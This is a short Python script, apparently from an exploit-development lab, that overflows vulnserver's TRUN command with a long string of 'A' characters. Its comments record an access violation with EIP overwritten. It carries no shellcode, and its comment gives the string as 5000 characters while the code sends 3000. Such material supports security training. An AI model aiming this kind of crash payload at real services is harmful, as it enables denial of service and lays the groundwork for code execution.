#!/usr/bin/python

#Attack type: stack-based buffer overflow en TRUN para vulnserver.
#Scope: Buffer overflow without shellcode injection.
#Payload: TRUN .AAAAAAAAAAAAAAA... (A 5000 times)
#Results: Access violation when executing 41414141... EAX [ASCII TRUN .AAAAA...] ESP [ASCII AAAAAAAAA...] EBP [41414141] EIP [41414141]

import socket
import os
import sys
import time

host = "192.168.0.2"
port = 9999

buffer = "TRUN ." + "A" * 3000

operation = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
operation.connect((host,port))
try:
	operation.sendall(buffer)
	time.sleep(5)
	operation.settimeout(5)
	data = operation.recv(2048)
	print(data)
except socket.error, e:
	print("Connection error: %s" % e)
	sys.exit(1)

operation.close()
sys.exit()

